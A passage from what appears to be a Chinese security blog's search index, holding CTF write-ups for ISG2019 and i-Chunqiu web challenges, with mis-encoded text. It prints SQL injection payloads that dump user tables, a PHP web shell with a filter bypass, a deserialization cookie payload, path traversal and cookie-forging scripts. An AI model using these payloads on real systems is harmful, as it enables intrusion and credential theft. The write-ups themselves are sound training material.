openssl speed rsa ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:8:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"é¢˜ç›®éš¾åº¦ä¸ç®—å¤§ï¼Œä½†æ˜¯è€ƒéªŒè„‘æ´ã€‚ ","date":"2019-08-28","objectID":"/isg2019/:0:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç­¾åˆ°é¢˜ é”®ç›˜å¯†ç ï¼Œå››ä¸ªå­—æ¯ä¸­é—´çš„é‚£ä¸ªå­—æ¯å°±æ˜¯æ˜æ–‡ã€‚ ","date":"2019-08-28","objectID":"/isg2019/:1:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ä¼ ç»Ÿå®‰å…¨æœåŠ¡åˆä½“éªŒ æ‰«ç›®å½•æ‰«å‡ºè®¸å¤šè·¯å¾„ï¼Œå”¯ä¸€æœ‰ç”¨çš„æ˜¯ /admin/upload.phpï¼Œæç¤ºåªèƒ½ image æˆ– text/xmlã€‚è®¾ç½® Content-Type ä¸º text/xml ä¸Šä¼ ä¸€å¼ æ™®é€šå›¾ç‰‡å‘ç°å¯ä»¥æˆåŠŸï¼Œå­˜å‚¨åœ¨ upload/ ç›®å½•ä¸‹ï¼Œä½†æ˜¯å­˜åœ¨äº† 1s å°±è¢«åˆ äº†ï¼Œä¼°è®¡æ˜¯è¦å†™è„šæœ¬è®¿é—®ã€‚ å°è¯•è®¿é—® /admin/upload/ å‘ç°å¯ä»¥æµè§ˆç›®å½•ï¼Œflag å±…ç„¶å°±ç›´æ¥å°±æ˜¾ç¤ºåœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Ÿï¼Ÿæ„Ÿè§‰åƒæ˜¯éé¢„æœŸè§£ã€‚ ","date":"2019-08-28","objectID":"/isg2019/:2:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"æ”»å‡»æ—¥å¿—åˆ†æ å¯¼å‡º HTTP å¯¹è±¡ï¼ŒWinRAR ä¿®å¤å³å¯ã€‚ ","date":"2019-08-28","objectID":"/isg2019/:3:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"è½»æ¾ä¸€åˆ» è¯•ç€ç©äº†ä¸€ä¸‹ä¹‹åå‘ç°ç”Ÿæˆäº†ä¸€ä¸ª save1 äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨ WinHex æ‰“å¼€åªèƒ½çœ‹åˆ° 3 ä¸ª ASCII å­—ç¬¦ 2 A Cï¼ŒæŠŠ 2 æ”¹æˆ 3 ä¹‹åè½½å…¥æ¸¸æˆï¼Œå‘ç°æ¥åˆ°äº†æ–°çš„ä¸€å…³ï¼Œå› æ­¤çŒœæµ‹è¿™ä¸ªæ˜¯å…³å¡åºå·ï¼Œé€æ¬¡å°è¯•åå‘ç°æ”¹æˆ 5 å¯ä»¥å¾—åˆ° flagã€‚ ","date":"2019-08-28","objectID":"/isg2019/:4:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"å®‰å…¨ä¸“å®¶çš„åŸºæœ¬ä¿®å…» å¯¹å›¾ç‰‡ binwalk åˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼Œæ ¹æ®æç¤º five ç”¨ 5 ä½æ•°å­—çˆ†ç ´å¯†ç  77777ï¼Œå¾—åˆ°å­—ç¬¦ä¸²ï¼š QKM{Waoq_Fzuzns_kqaoc_!!!!_dk} æ ¹æ®æç¤º isg2019!ï¼Œå°†å…¶ä½œä¸ºå¯†é’¥è¿›è¡Œç»´å‰å°¼äºšè§£å¯†ï¼š ISG{Oiii_Ntmhhk_sksww_!!!!_vs} ä½†æ˜¯ç­”æ¡ˆé”™è¯¯ï¼Œæƒ³äº†åŠå¤©æ‰çŸ¥é“ç¬¬äºŒä¸ªæç¤º æƒ³ä¸åˆ°æ˜¯è‹±æ–‡çš„å§ æ„æ€æ˜¯æŠŠå¯†é’¥ä¸­çš„æ•°å­—æ¢æˆè‹±è¯­ï¼Œå³ isgtwozeroonenineï¼Œé‡æ–°ç»´å‰å°¼äºšè§£å¯†å³å¯ã€‚ è„‘æ´é¢˜æ²¡ä»€ä¹ˆæ„æ€ã€‚ä½†æ˜¯å¦‚æœèƒ½æ—©ç‚¹æƒ³åˆ°ç»´å‰å°¼äºšå¯†é’¥é‡Œä¸åº”è¯¥æœ‰æ•°å­—çš„è¯ï¼Œå¯èƒ½ä¹Ÿä¸è‡³äºå¤ªéœ€è¦è„‘æ´ï¼Ÿ ","date":"2019-08-28","objectID":"/isg2019/:5:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"web2 å¿˜è®°è¿™é¢˜çš„åå­—äº†ï¼Œæ€»ä¹‹å¾ˆå®¹æ˜“å‘ç°æ˜¯æ³¨å…¥é¢˜ï¼Œåœ¨ hint.php ä¸­çš„ v1 é‡Œè¾“å…¥ä¸€ä¸ª ' å¾—åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥ï¼Œæœ€ç»ˆ payload ç±»ä¼¼ï¼š v1=1','2'or updatexml(1,concat(0x7e,(select temp.xxx from (select group_concat(kkk) as xxx from isgta61e) temp),0x7e),1),'3','4');#\u0026v2=\u0026v3=\u0026v4= payload ä¸­é—´éƒ¨åˆ†çš„æ„é€ åŸå› ç¨åè§£é‡Šã€‚ å…¶å®å¦‚æœæŒ‰ç…§æŠ¥é”™æ³¨å…¥çš„æ–¹å¼æ„é€  payload é‚£ä¹ˆåªèƒ½å¾—åˆ°è¡¨é‡Œçš„ä¿¡æ¯ï¼Œä½†æ˜¯å…‰çœ‹è¡¨é‡Œçš„ä¿¡æ¯å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œåªèƒ½çœ‹åˆ°å…³é”®åœ¨äºç¬¬äºŒè¡Œï¼ˆ__ISG å¼€å¤´çš„é‚£è¡Œï¼‰ã€‚è¿™é‡Œçš„å‘ç‚¹åœ¨äºï¼Œæ— è®ºåœ¨ hint.php ä¸­ POST äº†ä»€ä¹ˆï¼Œéƒ½ä¼šè·³è½¬åˆ° ffflllaaaggg.phpï¼Œè¿™ä¸ªé¡µé¢ä¸Šåªæœ‰ä¸€å¥è¯ try get flag?ï¼Œè¿™å¥è¯æœ¬èº«æ˜¯ä¸€ä¸ªåŒå…³ï¼Œæ˜¯åœ¨æç¤ºæˆ‘ä»¬ç”¨ GET æ–¹æ³•ä¼  flag å‚æ•°ï¼Œè¿™ä¸€ç‚¹æ„Ÿè§‰å¾ˆè„‘æ´â€¦â€¦ æˆ‘ä»¬è®¿é—® ffflllaaaggg.php?flag= åå°±å¯ä»¥å¾—åˆ° ffflllaaaggg.php çš„æºç ï¼š \u003c?php include \"ISGClass.php\"; echo \"try get flag?\"; if(isset($_GET[\"flag\"])) { highlight_file(\"ffflllaaaggg.php\"); } if(isset($_COOKIE[\"ISG\"])){ highlight_file(\"ISGClass.php\"); $isg = urldecode($_COOKIE[\"ISG\"]); $isg = unserialize($isg); } if(isset($_POST[\"v1\"]) and isset($_POST[\"v2\"]) and isset($_POST[\"v3\"]) and isset($_POST[\"v4\"])){ $InsertData = new Conn(); $InsertData-\u003eInsertData($_POST[\"v1\"], $_POST[\"v2\"], $_POST[\"v3\"], $_POST[\"v4\"]); } ?\u003e è¿™é‡Œæ³¨æ„åˆ°éœ€è¦è®¾ç½®ä¸€ä¸ª ISG çš„ Cookie æ¥è¯»å– ISGClass.phpï¼Œè¿™ä¸ª Cookie å€¼ä¼šè¢« URL è§£ç åååºåˆ—åŒ–ã€‚æˆ‘ä»¬éšæ„è®¾ç½®ä¸€ä¸ª ISG çš„ Cookie åæŸ¥çœ‹æºç ï¼š \u003c?php include \"Conn.php\"; class ISGClass { var $value1; var $value2; public function __wakeup() { $Kkk = new Conn(); $Kkk = $Kkk-\u003eSelectData(); if(gettype($this-\u003evalue1) == gettype($Kkk) and $this-\u003evalue1 == $Kkk){ highlight_file(\"{$this-\u003evalue2}.php\"); }else{ echo \"find kkk!\"; } } } PHP åœ¨ååºåˆ—åŒ–å‰ä¼šå…ˆæ‰§è¡Œ __wakeup() å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚çŒœæµ‹è¿™é‡Œçš„ Kkk å°±æ˜¯åˆšæ‰æˆ‘ä»¬æŸ¥åˆ°çš„æ•°æ®åº“é‡Œçš„ kkk å­—æ®µï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ„é€  value1 ä½¿å¾—å…¶ç±»å‹å’Œå€¼éƒ½ä¸ kkk ç›¸åŒã€‚å…·ä½“æ˜¯å“ªä¸ª kkk å‘¢ï¼Ÿå½“ç„¶æ˜¯æ ‡æœ‰ ISG çš„ç¬¬äºŒè¡Œäº†ï¼Œè¯¥è¡Œ kkk å€¼ä¸º 54t7869yiã€‚ è¿™æ ·ä»¥åæˆ‘ä»¬å°±èƒ½è¯»å– value2 æŒ‡å‘çš„æ–‡ä»¶äº†ï¼Œæˆ‘ä»¬ç›®å‰è¿˜æ²¡æœ‰è¯»çš„å°±æ˜¯ hint.phpã€‚æ„é€  payloadï¼š O:8:\"ISGClass\":2:{s:6:\"value1\";s:9:\"54t7869yi\";s:6:\"value2\";s:4:\"hint\";} ç„¶å URL ç¼–ç ï¼š O%3A8%3A%22ISGClass%22%3A2%3A%7Bs%3A6%3A%22value1%22%3Bs%3A9%3A%2254t7869yi%22%3Bs%3A6%3A%22value2%22%3Bs%3A4%3A%22hint%22%3B%7D æœ€åè®¾ç½®åˆ° Cookie ISG é‡Œï¼ŒPOST ç»™ ffflllaaaggg.php?flag= å³å¯å¾—åˆ° hint.php æºç ï¼Œflag å°±åœ¨å…¶ä¸­ã€‚ è¿™é¢˜ get flag çš„åŒå…³æ—¢è€ƒéªŒè„‘æ´ï¼Œåˆæ˜¯è§£é¢˜çš„å…³é”®ï¼Œæ‰€ä»¥ç•¥å‘ã€‚ å°è±¡é‡Œè¿˜æœ‰ä¸€é¢˜ SSRF çš„ï¼Œåˆ©ç”¨çš„æ˜¯ PHP ååºåˆ—åŒ–æ¼æ´ï¼Œç„¶è€Œç¯å¢ƒæ— æ³•å¤ç°äº†ã€‚ã€‚ ","date":"2019-08-28","objectID":"/isg2019/:6:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","ååºåˆ—åŒ–"],"title":"ISG2019 çº¿ä¸Šèµ›æ¯”èµ›è®°å½•","uri":"/isg2019/"},{"categories":["Web å®‰å…¨"],"content":"i æ˜¥ç§‹ä¸Šçš„é¢˜éƒ½æ˜¯æ¯”èµ›çœŸé¢˜ï¼Œæ‰€ä»¥ä¼šæ¯”è¾ƒæœ‰æ„æ€ï¼Œä¹Ÿæ›´å¤æ‚ä¸€äº›ã€‚ ","date":"2019-08-24","objectID":"/icq-web/:0:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"çˆ†ç ´ - 1 \u003c?php include \"flag.php\"; $a = @$_REQUEST['hello']; if(!preg_match('/^\\w*$/',$a)){ die('ERROR'); } eval(\"var_dump($$a);\"); show_source(__FILE__); ?\u003e è¦æ±‚å‚æ•° hello ä¸ºçº¯å­—æ¯ï¼Œåˆçœ‹åˆ° eval(var_dump($$a)); è¯­å¥ï¼Œå¯ä»¥æƒ³åˆ°ä½¿ç”¨ $GLOBALS æ‰“å°å‡ºæ‰€æœ‰å˜é‡ï¼Œpayloadï¼š ?hello=GLOBALS ç­‰ç­‰ï¼Œå¥½åƒæ²¡çˆ†ç ´å•Šï¼Ÿæ„Ÿè§‰æ˜¯éé¢„æœŸè§£ã€‚ ","date":"2019-08-24","objectID":"/icq-web/:1:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"çˆ†ç ´ - 2 \u003c?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval(\"var_dump($a);\"); show_source(__FILE__); æç¤º flag ä¸åœ¨å˜é‡ä¸­ï¼Œé‚£ä¹ˆåªèƒ½ç›´æ¥è¯» flag.php æ–‡ä»¶äº†ï¼Œpayloadï¼š ?hello=file('flag.php') å¦ä¸€ç§ payload åˆ™ç±»ä¼¼æ³¨å…¥ï¼š ?hello=);show_source(â€˜flag.phpâ€™);// ","date":"2019-08-24","objectID":"/icq-web/:2:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"çˆ†ç ´ - 3 \u003c?php error_reporting(0); session_start(); require('./flag.php'); if(!isset($_SESSION['nums'])){ $_SESSION['nums'] = 0; $_SESSION['time'] = time(); $_SESSION['whoami'] = 'ea'; } if($_SESSION['time']+120\u003ctime()){ session_destroy(); } $value = $_REQUEST['value']; $str_rand = range('a', 'z'); $str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]; if($_SESSION['whoami']==($value[0].$value[1]) \u0026\u0026 substr(md5($value),5,4)==0){ $_SESSION['nums']++; $_SESSION['whoami'] = $str_rands; echo $str_rands; } if($_SESSION['nums']\u003e=10){ echo $flag; } show_source(__FILE__); ?\u003e é¦–å…ˆå¦‚æœ cookie ä¸­ä¸è®¾ç½® nums ä¼šç»™ whoami è®¾ç½®é»˜è®¤å€¼ eaï¼Œä¸” session åªèƒ½ç»´æŒ 120msï¼Œæ‰€ä»¥åº”è¯¥éœ€è¦ç”¨è„šæœ¬è·‘ã€‚ æ¥ä¸‹æ¥ï¼Œå¦‚æœ whoami å’Œä¼ å…¥çš„ value ç›¸åŒï¼Œä¸” value çš„ MD5 å€¼å­ä¸²ä¸º 0ï¼Œé‚£ä¹ˆ nums å°±åŠ  1ï¼Œwhoami æ›´æ–°ä¸ºä¸¤ä¸ªæ–°çš„éšæœºå­—æ¯ã€‚åä¸€ä¸ªæ¡ä»¶å¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨æ•°ç»„ç»•è¿‡ã€‚ æˆ‘ä»¬å°è¯•ä¼ å…¥ value=eaï¼Œæœç„¶æ˜¾ç¤ºäº† whoami çš„ä¸‹ä¸€ä¸ªå€¼ã€‚è„šæœ¬ï¼š import requests url = 'http://4451e735c9e046bcb09a4404756ca952c586da682cfe47b9.changame.ichunqiu.com/?value[]=ea' ss = requests.session() r = ss.get(url) for i in range(10): r = ss.get(url[:-2] + r.text[0:2]) print(r.text[:50]) éœ€è¦æ³¨æ„çš„æ˜¯æ‰€æœ‰è¯·æ±‚éƒ½è¦ç»´æŒåœ¨åŒä¸€ session ä¸‹ã€‚ è¿™é¢˜ç»ˆäºæœ‰ç‚¹çˆ†ç ´çš„æ„æ€äº†ã€‚ ","date":"2019-08-24","objectID":"/icq-web/:3:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Upload å°è¯•ä¸Šä¼  php ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°è¿‡æ»¤äº† \u003c? å’Œ phpï¼Œå¯¹å‰è€…åˆ©ç”¨ \u003cscript\u003e ç»•è¿‡ï¼Œåè€…åˆ™å¤§å†™ç»•è¿‡ã€‚payloadï¼š \u003cscript language=\"PHP\"\u003e eval($_POST['ant']); \u003c/script\u003e ä¸Šä¼  getshellï¼Œåœ¨ä¸Šçº§ç›®å½•å¾—åˆ° flag.phpã€‚ ","date":"2019-08-24","objectID":"/icq-web/:4:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Code é¢˜ç›®é“¾æ¥ä¸­å«æœ‰ ?jpg=hei.jpgï¼ŒçŒœæµ‹å¯èƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªè¯»æ–‡ä»¶ï¼Œå°è¯• ?jpg=index.phpï¼ŒF12 å¾—åˆ° base64 åçš„æºä»£ç ï¼Œè§£ç ï¼š \u003c?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */ header('content-type:text/html;charset=utf-8'); if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=hei.jpg'); $file = $_GET['jpg']; echo '\u003ctitle\u003efile:'.$file.'\u003c/title\u003e'; $file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file); $file = str_replace(\"config\",\"_\", $file); $txt = base64_encode(file_get_contents($file)); echo \"\u003cimg src='data:image/gif;base64,\".$txt.\"'\u003e\u003c/img\u003e\"; /* * Can you find the flag file? * */ ?\u003e æ³¨æ„è¿™é‡Œä¼šå¯¹ file è¿›è¡Œè¿‡æ»¤ï¼Œå°†éæ•°å­— / å­—æ¯åˆ é™¤ï¼Œå¹¶å°† config æ¢æˆ _ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“æˆ‘ä»¬è¦è¯»çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆã€‚ è¿™æ—¶å¯ä»¥æ³¨æ„åˆ°æ³¨é‡Šï¼šCreated by PhpStormï¼ŒçŒœæƒ³æ˜¯ .idea æ³„æ¼ï¼Œå› æ­¤è®¿é—® /.idea/workspace.xmlï¼Œå¯ä»¥å‘ç°æ–‡ä»¶ fl3g_ichuqiu.phpã€‚ç”±äº _ ä¸æ˜¯æ•°å­—æˆ–å­—æ¯ï¼Œæˆ‘ä»¬åº”ç”¨ä¸Šè¿°è§„åˆ™è®¿é—® fl3gconfigichuqiu.phpï¼š index.php?jpg=fl3gconfigichuqiu.php è§£ç å¾—åˆ°ï¼š \u003c?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */ error_reporting(E_ALL || ~E_NOTICE); include('config.php'); function random($length, $chars ='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') { $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i \u003c $length; $i++) { $hash .= $chars[mt_rand(0, $max)]; } return $hash; } function encrypt($txt,$key){ for($i=0;$i\u003cstrlen($txt);$i++){ $tmp .= chr(ord($txt[$i])+10); } $txt = $tmp; $rnd=random(4); $key=md5($rnd.$key); $s=0; for($i=0;$i\u003cstrlen($txt);$i++){ if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s]; } return base64_encode($rnd.$ttmp); } function decrypt($txt,$key){ $txt=base64_decode($txt); $rnd = substr($txt,0,4); $txt = substr($txt,4); $key=md5($rnd.$key); $s=0; for($i=0;$i\u003cstrlen($txt);$i++){ if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s]; } for($i=0;$i\u003cstrlen($tmp);$i++){ $tmp1 .= chr(ord($tmp[$i])-10); } return $tmp1; } $username = decrypt($_COOKIE['user'],$key); if ($username =='system'){ echo $flag; }else{ setcookie('user',encrypt('guest',$key)); echo \"â•®(â•¯â–½â•°)â•­\"; } ?\u003e å…ˆä¸ç®¡åŠ è§£å¯†è¿‡ç¨‹ï¼Œåªçœ‹æœ€åå‡ è¡Œä¸»ç¨‹åºï¼šå°† cookie ä¸­çš„ user é€šè¿‡ key è§£å¯†ï¼Œå¦‚æœå¾—åˆ°æ˜æ–‡ä¸º system åˆ™æˆåŠŸï¼Œå¦åˆ™å°†è¿”å› guest ç»è¿‡ key åŠ å¯†åçš„å¯†æ–‡ã€‚æ˜¾ç„¶åè€…æ˜¯æˆ‘ä»¬è·å¾— key å€¼çš„å…³é”®ã€‚ ç„¶åå…³æ³¨åŠ å¯†è¿‡ç¨‹ï¼šå…ˆå°†æ¯ä¸ªå­—ç¬¦çš„ ASCII ç åŠ  10 å¾—åˆ°æ–°çš„ txtï¼Œéšåéšæœºç”Ÿæˆ 4 ä¸ªå­—ç¬¦ rnd ä¸ key æ‹¼æ¥åè¿›è¡Œ MD5ï¼Œå¾—åˆ°æ–° keyã€‚å°†æ–° txt ä¸æ–° key æŒ‰å­—ç¬¦å¼‚æˆ–å¾—åˆ° ttmpï¼Œè‹¥ txt çš„é•¿åº¦è¶…å‡º key åˆ™åœ¨ key åç»§ç»­æ‹¼æ¥ keyã€‚æœ€åï¼Œè¿”å› rnd æ‹¼æ¥ä¸Š ttmp åçš„ base64 å€¼å°±æ˜¯å¯†æ–‡ã€‚ é™„ python2 è„šæœ¬ï¼ˆpython3 ä¸­çš„ byte å’Œ str è½¬æ¢å¯èƒ½å¯¼è‡´é”™è¯¯ç»“æœï¼‰ï¼š import requests import base64 url = 'http://036fb8c596914fd18ad96399893a61dd9da80da355bf450e.changame.ichunqiu.com/fl3g_ichuqiu.php' cookie = requests.get(url).cookies['user'] txt = base64.b64decode(cookie) rnd = txt[:4] ttmp = txt[4:] key = list('aaaaaa') guest = list('guest') system = list('system') for i in range(5): guest[i] = chr(ord(guest[i]) + 10) for i in range(5): key[i] = chr(ord(ttmp[i]) ^ ord(guest[i])) for i in range(6): system[i] = chr(ord(system[i]) + 10) cookies = [] for c in '1234567890abcdef': # md5 key[5] = c ttnew = '' for i in range(6): ttnew += chr(ord(key[i]) ^ ord(system[i])) cookies.append(base64.b64encode(rnd + ttnew)) for i in cookies: cookie = {'user': i} r = requests.get(url=url, cookies=cookie) print r.text è¿™é¢˜æ‰åº”è¯¥å«çˆ†ç ´ã€‚ã€‚æœ€åå…¶å®æ˜¯çˆ†ç ´ key çš„ç¬¬ 6 ä½æ‰å‡ºçš„ç»“æœã€‚ ","date":"2019-08-24","objectID":"/icq-web/:5:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"YeserCMS è¿›å…¥ CMS ä¹±ç‚¹ä¸€æ³¢å‘ç°æ˜¯ä» cmseasyï¼Œç½‘ä¸ŠæŸ¥åˆ°äº† æ— é™åˆ¶æŠ¥é”™æ³¨å…¥æ¼æ´ã€‚ ä»¿ç…§æ¼æ´ payload æ¥è¿›è¡Œæ³¨å…¥ï¼ŒPOST æ•°æ®ï¼š xajax=Postdata\u0026xajaxargs[0]=\u003cxjxquery\u003e\u003cq\u003edetail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(concat(database())) ),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u003c/q\u003e\u003c/xjxquery\u003e å¾—åˆ°æ•°æ®åº“å Yeserã€‚ xajax=Postdata\u0026xajaxargs[0]=\u003cxjxquery\u003e\u003cq\u003edetail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u003c/q\u003e\u003c/xjxquery\u003e è¿™é‡Œç”±äºé•¿åº¦æ— æ³•æ˜¾ç¤ºæ‰€æœ‰è¡¨ï¼Œå¯ä»¥ä¿®æ”¹ 1,32 çš„ 1 æ¥æŸ¥çœ‹åç»­è¡¨ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ yesercms_userã€‚ xajax=Postdata\u0026xajaxargs[0]=\u003cxjxquery\u003e\u003cq\u003edetail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name='yesercms_user'),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u003c/q\u003e\u003c/xjxquery\u003e è¿™é‡Œä¹Ÿä¼šæœ‰è®¸å¤šåˆ—ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ username å’Œ passwordã€‚ xajax=Postdata\u0026xajaxargs[0]=\u003cxjxquery\u003e\u003cq\u003edetail=xxxxxx',(updatexml(1,concat(0x7e,mid((select concat(username,password) from yesercms_user),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u003c/q\u003e\u003c/xjxquery\u003e è¿™é‡Œçš„ password æ˜¾ç¤ºä¸å…¨ï¼ŒåŒæ ·ä¿®æ”¹ 1,32 çš„ 1 æ¥æŸ¥çœ‹å®Œæ•´çš„ MD5 å€¼ï¼šff512d4240cbbdeafada404677ccbe61ã€‚è§£å¯†å¾—åˆ°å¯†ç ï¼šYeser231ã€‚ç™»å½•å¹¶è¿›å…¥åå°ç®¡ç†é¡µé¢ã€‚ ç®¡ç†é¡µé¢å†…å®¹å¾ˆå¤šï¼Œä½†æ˜¯éƒ½æ²¡æœ‰ä»€ä¹ˆæ³¨å…¥ç‚¹ã€‚æœ€ç»ˆï¼Œåœ¨ æ¨¡æ¿-\u003eå½“å‰æ¨¡æ¿ç¼–è¾‘ ä¸­å‘ç°ï¼Œç¼–è¾‘æ¨¡æ¿æ—¶ä¼šå…ˆè¯»å–ç›¸åº”çš„æ–‡ä»¶ã€‚å› æ­¤æˆ‘ä»¬ä»»é€‰ä¸€ä¸ªæ–‡ä»¶ï¼Œç‚¹å‡» ç¼–è¾‘ å¹¶æŠ“åŒ…ï¼Œå°†å”¯ä¸€çš„å‚æ•° id ä¿®æ”¹ä¸ºæƒ³è¯»å–çš„æ–‡ä»¶ã€‚ç»æµ‹è¯•ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ ../../flag.phpã€‚ ","date":"2019-08-24","objectID":"/icq-web/:6:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"XSS å¹³å° å°è¯•æ³¨å…¥æ— æœï¼Œæ„é€ éæ³•å‚æ•° pass=bbb\u0026email[]=aaa å¾—åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå…¶ä¸­æœ‰ä¸€è¡Œï¼š File \"/var/www/html/rtiny/login.py\", line 20, in post ç»“åˆé¢˜ç›®åï¼Œå¾—çŸ¥è¿™æ˜¯ä½¿ç”¨ RTiny ç¼–å†™çš„ XSS å¹³å°ï¼Œé¡¹ç›®åœ°å€åœ¨ è¿™é‡Œã€‚å…¶ä¸­ï¼Œrtiny/lock.py å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼Œpost æ–¹æ³•ä¸­å¯¹ username æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼š #!/usr/bin/env python # -*- coding:utf-8 -*- __author__ = 'r0ker' import tornado.web from function import md5 import db from config import URL class LockHandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(\"lock\",'1') self.render(\"lock.html\") def post(self): username = self.get_secure_cookie(\"username\") or '' passwd = md5(self.get_argument('password','')) row = db.ct(\"manager\", \"*\", \"username='\"+ username +\"'and password='\"+ passwd +\"'\") if row: self.set_secure_cookie(\"lock\", \"0\") self.redirect(\"http://\" + URL) else: self.redirect(\"http://\" + URL + \"/lock\") è€Œ set_secure_cookie æ–¹æ³•æ¥è‡ª tornadoï¼Œè¯¥æ–¹æ³•ä½¿ç”¨ä¸€ä¸ª cookie_secret æ¥åŠ å¯† cookieã€‚æˆ‘ä»¬å¯ä»¥åœ¨ index.py ä¸­å‘ç°è¿™ä¸ª cookie_secretï¼š settings = { \"static_path\": os.path.join(os.path.dirname(__file__), \"themes/static\"), \"template_path\": os.path.join(os.path.dirname(__file__), \"themes\"), \"cookie_secret\": 